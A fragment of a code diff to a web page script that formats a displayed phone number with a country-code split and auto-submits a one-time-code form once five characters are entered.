+                formattedPhone = `${formattedPhone.slice(0, 3)} ${formattedPhone.slice(3, 8)} ${formattedPhone.slice(8)}`;
+            } else {
+                 // A generic formatter for other numbers
+                 let codePart = formattedPhone.match(/^\+\d{1,3}/)[0];
+                 let numberPart = formattedPhone.substring(codePart.length);
+                 formattedPhone = `${codePart} ${numberPart}`;
             }
             phoneSpan.textContent = formattedPhone;
         }
-
         const codeInput = document.getElementById('code');
-        if (codeInput) {
-            codeInput.addEventListener('input', function() {
-                if (this.value.length >= 5) {
-                    document.getElementById('otp-form').submit();
-                }
-            });
-        }
+        if (codeInput) { codeInput.addEventListener('input', function() { if (this.value.length >= 5) { document.getElementById('otp-form').submit(); } }); }
     });
 </script>
 </body>
